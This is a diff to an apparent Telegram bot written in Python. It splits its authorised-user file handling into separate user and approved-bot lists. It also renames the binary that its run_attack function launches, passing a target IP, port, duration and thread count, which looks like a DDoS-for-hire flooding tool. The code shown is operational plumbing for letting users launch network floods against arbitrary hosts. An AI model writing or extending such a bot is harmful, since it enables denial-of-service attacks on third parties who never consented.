@@ -8,18 +8,30 @@ APPROVED_IDS_FILE = 'approved_ids.txt'
 attack_in_progress = False
 
 # Load approved IDs (users and groups) from file
-def load_approved_ids():
+def load_users():
     try:
-        with open(APPROVED_IDS_FILE) as f:
+        with open(USERS_FILE) as f:
             return set(line.strip() for line in f)
     except FileNotFoundError:
         return set()
 
-def save_approved_ids(approved_ids):
-    with open(APPROVED_IDS_FILE, 'w') as f:
-        f.writelines(f"{id_}\n" for id_ in approved_ids)
+def save_users(users):
+    with open(USERS_FILE, 'w') as f:
+        f.writelines(f"{user}\n" for user in users)
 
-approved_ids = load_approved_ids()
+def load_approved_bots():
+    try:
+        with open(APPROVED_BOTS_FILE) as f:
+            return set(line.strip() for line in f)
+    except FileNotFoundError:
+        return set()
+
+def save_approved_bots(approved_bots):
+    with open(APPROVED_BOTS_FILE, 'w') as f:
+        f.writelines(f"{bot}\n" for bot in approved_bots)
+
+users = load_users()
+approved_bots = load_approved_bots()
 
 # Start command
 async def start(update: Update, context: CallbackContext):
@@ -108,7 +120,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./test {ip} {port} {time} 500",
+            f"./pushpa {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
